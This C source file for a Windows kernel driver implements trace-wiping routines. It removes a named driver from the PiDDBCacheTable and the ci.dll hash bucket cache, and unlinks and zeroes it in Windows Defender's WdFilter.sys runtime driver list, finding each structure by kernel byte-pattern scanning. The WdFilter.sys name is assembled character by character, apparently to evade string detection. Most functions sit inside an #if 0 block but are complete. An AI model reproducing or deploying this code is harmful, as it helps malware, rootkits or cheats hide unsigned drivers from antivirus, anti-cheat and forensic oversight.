#include "main.h"

#ifndef METHOD_DECLARE_STRUCTURE
#define METHOD_DECLARE_STRUCTURE(x) \
    typedef struct _##x x, *P##x;   \
    struct _##x
#endif

#define MM_UNLOADED_DRIVER_SIZE 50

METHOD_DECLARE_STRUCTURE(PIDDB_CACHE_ENTRY)
{
    LIST_ENTRY List;
    UNICODE_STRING DriverName;
    ULONG TimeDateStamp;
    NTSTATUS LoadStatus;
    CHAR _0x0028[16]; // data from the shim engine, or uninitialized memory for
                      // custom drivers
};

METHOD_DECLARE_STRUCTURE(HASH_BUCKET_ENTRY)
{
    struct _HASH_BUCKET_ENTRY* Next;
    UNICODE_STRING DriverName;
    ULONG CertHash[5];
};

METHOD_DECLARE_STRUCTURE(MM_UNLOADED_DRIVER)
{
    UNICODE_STRING Name;
    PVOID ModuleStart;
    PVOID ModuleEnd;
    ULONG64 UnloadTime;
};

METHOD_DECLARE_STRUCTURE(MP_RUNTIME_DRIVERS)
{
    LIST_ENTRY DriverInfoList;
    UNICODE_STRING ImageName;
    UNICODE_STRING DriverRegistryPath;
    UNICODE_STRING CertPublisher;
    UNICODE_STRING CertIssuer;
    PVOID ImageHash;
    INT ImageHashAlgorithm;
    INT ImageHashLength;
    PVOID CertThumbprint;
    INT ThumbprintHashAlgorithm;
    INT CertificateThumbprintLength;
    PVOID ImageBase;
    INT64 ImageSize;
    INT ImageFlags;
    INT DriverClassification;
    INT ModuleEntryEnd;
};

METHOD_DECLARE_STRUCTURE(MP_DRIVERS_INFO)
{
    LONG Status;
    LONGLONG Reserved;
    ULONG ElamSignaturesMajorVer;
    ULONG ElamSignatureMinorVer;
    LIST_ENTRY LoadedDriversList;
    PSLIST_ENTRY ElamRegistryEntries;
    LIST_ENTRY BootProcessList;
    PCALLBACK_OBJECT CallbackObject;
    PVOID BootDriverCallbackRegistration;
    FAST_MUTEX DriversInfoFastMutex;
    ULONG TotalDriverEntriesLenght;
    PVOID SeRegisterImageVerificationCallback;
    PVOID SeUnregisterImageVerificationCallback;
    PVOID ImageVerificationCbHandle;
    LONG RuntimeDriversCount;
    ULONG RuntimeDriversArrayLenght;
    PVOID RuntimeDriversArray;
    LIST_ENTRY RuntimeDriversList;
    LONGLONG field_C8;
};

#if 0
FORCEINLINE PPIDDB_CACHE_ENTRY LookupEntry(_In_ PRTL_AVL_TABLE PiDDBCacheTable, _In_ PKLDR_DATA_TABLE_ENTRY DriverTable)
{
    PIDDB_CACHE_ENTRY LocalEntry;
    LocalEntry.TimeDateStamp = DriverTable->TimeDateStamp;
    RtlInitUnicodeString(&LocalEntry.DriverName, DriverTable->BaseDllName.Buffer);
    return (PPIDDB_CACHE_ENTRY)RtlLookupElementGenericTableAvl(PiDDBCacheTable, &LocalEntry);
}

FORCEINLINE BOOLEAN RemoveFromPidDbCacheTable(_In_ PKLDR_DATA_TABLE_ENTRY DriverTable)
{
    PVOID PiDDBLockPtr;
    PVOID PiDDBCacheTablePtr;
    PERESOURCE PiDDBLock;
    PRTL_AVL_TABLE PiDDBCacheTable;
    BOOLEAN Succeeded;
    PPIDDB_CACHE_ENTRY CacheEntry;
    PLIST_ENTRY PrevEntry, NextEntry;

    Succeeded = FALSE;

    //
    // PiDDBLock pattern changes a lot from version 1607 of windows and we will
    // need a second pattern if we want to keep simple as posible 48 8B 0D ? ? ?
    // ? 48 85 C9 0F 85 ? ? ? ? 48 8D 0D ? ? ? ? E8 ? ? ? ? E8 build 22449+
    // (pattern can be improved but just fine for now)
    //

    UCHAR Pattern01[] = "\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F"
                        "\x85\x00\x00\x00"
                        "\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00"
                        "\x00\x00\xE8";
    CHAR Mask01[]     = "xxx????xxxxx????xxx????x????x";
    UCHAR Pattern02[] = "\x66\x03\xD2\x48\x8D\x0D";

    PiDDBLockPtr       = MiFindPattern(GetKernelBase()->DllBase, GetKernelBase()->SizeOfImage, Pattern01, Mask01);
    PiDDBLockPtr       = RtlOffsetToPointer(PiDDBLockPtr,
                                      16); // second pattern offset
    PiDDBCacheTablePtr = MiFindPattern(GetKernelBase()->DllBase, GetKernelBase()->SizeOfImage, Pattern02, (PCHAR) "xxxxxx");
    if (PiDDBLockPtr == 0 || PiDDBCacheTablePtr == 0) {
        return Succeeded;
    }

    PiDDBLock       = MiRelativeVirtualAddress(PiDDBLockPtr, 3, 7);
    PiDDBCacheTable = MiRelativeVirtualAddress(PiDDBCacheTablePtr, 6, 10);

    if (ExAcquireResourceExclusiveLite(PiDDBLock, TRUE)) {
        CacheEntry = LookupEntry(PiDDBCacheTable, DriverTable);
        if (CacheEntry) {
            NextEntry        = CacheEntry->List.Flink;
            PrevEntry        = CacheEntry->List.Blink;
            PrevEntry->Flink = NextEntry;
            NextEntry->Blink = PrevEntry;

            if (RtlDeleteElementGenericTableAvl(PiDDBCacheTable, CacheEntry)) {
                if (PiDDBCacheTable->DeleteCount > 0) {
                    PiDDBCacheTable->DeleteCount--;
                }

                Succeeded = TRUE;
            }
        }
        ExReleaseResourceLite(PiDDBLock);
    }

    return Succeeded;
}

FORCEINLINE BOOLEAN RemoveFromHashBucketList(_In_ PKLDR_DATA_TABLE_ENTRY DriverTable)
{
    PKLDR_DATA_TABLE_ENTRY Module     = GetSystemModule(L"ci.dll");
    PHASH_BUCKET_ENTRY HashBucketList = NULL, PrevEntry = NULL;
    PERESOURCE HashCacheLock = NULL;
    USHORT DriverNameVA;
    LPWSTR DriverNameBuffer;
    UNICODE_STRING BaseDriverName;

    if (Module) {
        UCHAR Pattern[] = "\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00"
                          "\xF7\x43\x40\x00\x20\x00\x00";
        HashBucketList  = MiFindPattern(Module->DllBase, Module->SizeOfImage, Pattern, "xxx????x?xxxxxxx");
        HashCacheLock   = MiFindPattern((PCHAR)HashBucketList - 50, 50, (PUCHAR) "\x48\x8D\x0D", "xxx");

        if (HashBucketList && HashCacheLock) {
            HashBucketList = MiRelativeVirtualAddress(HashBucketList, 3, 7);
            HashCacheLock  = MiRelativeVirtualAddress(HashCacheLock, 3, 7);
        }
    }

    if (HashBucketList && HashCacheLock) {
        if (ExAcquireResourceExclusiveLite(HashCacheLock, TRUE)) {
            PrevEntry = HashBucketList;
            while (HashBucketList->Next != NULL) {
                if (HashBucketList->DriverName.Buffer) {
                    DriverNameVA      = HashBucketList->DriverName.Length - DriverTable->BaseDllName.Length;
                    DriverNameVA     /= sizeof(WCHAR);
                    DriverNameBuffer  = HashBucketList->DriverName.Buffer + DriverNameVA;
                    RtlInitUnicodeString(&BaseDriverName, DriverNameBuffer);

                    if (RtlEqualUnicodeString(&BaseDriverName, &DriverTable->BaseDllName, TRUE) == TRUE) {
                        PrevEntry->Next = HashBucketList->Next;

                        RtlSecureZeroMemory(HashBucketList->CertHash, sizeof(HashBucketList->CertHash));
                        RtlSecureZeroMemory(HashBucketList->DriverName.Buffer, HashBucketList->DriverName.Length);
                        RtlSecureZeroMemory(&HashBucketList->DriverName, sizeof(HashBucketList->DriverName));
                        ExFreePool(HashBucketList);
                        HashBucketList = NULL;

                        ExReleaseResourceLite(HashCacheLock);
                        return TRUE;
                    }
                }

                PrevEntry      = HashBucketList;
                HashBucketList = HashBucketList->Next;
            }
            ExReleaseResourceLite(HashCacheLock);
        }
    }

    return FALSE;
}

BOOLEAN WdFilterDriverRuntimeList(_In_ PKLDR_DATA_TABLE_ENTRY DriverTable)
{
    UCHAR DriverRuntimeListCountPattern[] = "\xFF\x05\xCC\xCC\xCC\xCC\x48\x39\x11";
    CHAR DriverRuntimeListCountMask[]     = "xx????xxx";
    PLONG DriverRuntimeListCount;
    PKLDR_DATA_TABLE_ENTRY ModuleBase;
    PMP_RUNTIME_DRIVERS RuntimeDriver;
    PMP_DRIVERS_INFO DriversInfo;
    PLIST_ENTRY CurrentEntry;

    // ========================================================================================================
    // DriverRuntimeListTable ( Blink )
    // SigMakerEx: Finding signature for 00000000057EB9.
    // Address SIG : 0x00000000057EB9, 9 bytes 4, wildcards.
    // IDA: "48 8B 0D ?? ?? ?? ?? FF 05"
    // ========================================================================================================
    // DriverRuntimeListCount
    // SigMakerEx: Finding signature for 00000000057EC0.
    // Address SIG : 0x00000000057EC0, 9 bytes 4, wildcards.
    // IDA: "FF 05 ?? ?? ?? ?? 48 39 11"
    // ========================================================================================================
    //[+] Input variable name:
    //ModuleName
    //[+] Input string:
    //WdFilter.sys

    WCHAR ModuleName[13];
    ModuleName[0]  = L'W';
    ModuleName[1]  = L'd';
    ModuleName[2]  = L'F';
    ModuleName[3]  = L'i';
    ModuleName[4]  = L'l';
    ModuleName[5]  = L't';
    ModuleName[6]  = L'e';
    ModuleName[7]  = L'r';
    ModuleName[8]  = L'.';
    ModuleName[9]  = L's';
    ModuleName[10] = L'y';
    ModuleName[11] = L's';
    ModuleName[12] = L'\0';

    ModuleBase = GetSystemModule(ModuleName);
    if (ModuleBase == NULL) {
        // Windows Defender doesn't active.
        return TRUE;
    }

    DriverRuntimeListCount = MiFindPattern(ModuleBase->DllBase, ModuleBase->SizeOfImage, DriverRuntimeListCountPattern, DriverRuntimeListCountMask);
    if (!DriverRuntimeListCount) {
        DebugPrint("[!] %hs: MiFindPattern->DriverRuntimeListCount", __FUNCTION__);
        return FALSE;
    }

    DriverRuntimeListCount = MiRelativeVirtualAddress(DriverRuntimeListCount, 2, 6);
    if (!DriverRuntimeListCount) {
        DebugPrint("[!] %hs: MiRelativeVirtualAddress->DriverRuntimeListCount", __FUNCTION__);
        return FALSE;
    }

    DriversInfo = CONTAINING_RECORD(DriverRuntimeListCount, MP_DRIVERS_INFO, RuntimeDriversCount);
    ExAcquireFastMutex(&DriversInfo->DriversInfoFastMutex);

    for (CurrentEntry = DriversInfo->RuntimeDriversList.Flink; CurrentEntry != &DriversInfo->RuntimeDriversList; CurrentEntry = CurrentEntry->Flink) {
        RuntimeDriver = CONTAINING_RECORD(CurrentEntry, MP_RUNTIME_DRIVERS, DriverInfoList);

        if (wcsstr(RuntimeDriver->ImageName.Buffer, DriverTable->BaseDllName.Buffer)) {
            RtlZeroMemory(RuntimeDriver->ImageHash, RuntimeDriver->ImageHashLength);
            RtlZeroMemory(RuntimeDriver->CertThumbprint, RuntimeDriver->CertificateThumbprintLength);
            RtlZeroMemory(RuntimeDriver->ImageName.Buffer, RuntimeDriver->ImageName.MaximumLength);

            RemoveEntryList(CurrentEntry);
            InterlockedDecrement(&DriversInfo->RuntimeDriversCount);
        }
    }

    ExReleaseFastMutex(&DriversInfo->DriversInfoFastMutex);
    return TRUE;
}

BOOLEAN RemoveDriverRuntimeList(_In_ PKLDR_DATA_TABLE_ENTRY DriverTable)
{
    PCHAR DumpHeader;
    PMM_UNLOADED_DRIVER MmUnloadedDriver;
    LONG MmUnloadDriverCount;
    CONTEXT Context;

    Context.ContextFlags = CONTEXT_FULL;
    DumpHeader           = NULL;
    MmUnloadedDriver     = NULL;
    MmUnloadDriverCount  = -1;

    if (RemoveFromPidDbCacheTable(DriverTable) == FALSE) {
        DebugPrint("[!] Failed RemoveFromPidDbCacheTable.");
        return FALSE;
    }

    if (RemoveFromHashBucketList(DriverTable) == FALSE) {
        DebugPrint("[!] Failed RemoveFromHashBucketList.");
        return FALSE;
    }

    //
    // MmUnloadedDrivers.
    //
    DriverTable->BaseDllName.Length = 0;

    if (GetSystemModule(L"WdFilter.sys") != NULL) {
        if (WdFilterDriverRuntimeList(&DriverTable->BaseDllName) == FALSE) {
            DebugPrint("[!] Failed Handle WdFilter Driver Runtime List.");

            return FALSE;
        }
    }

    return TRUE;
}
#endif
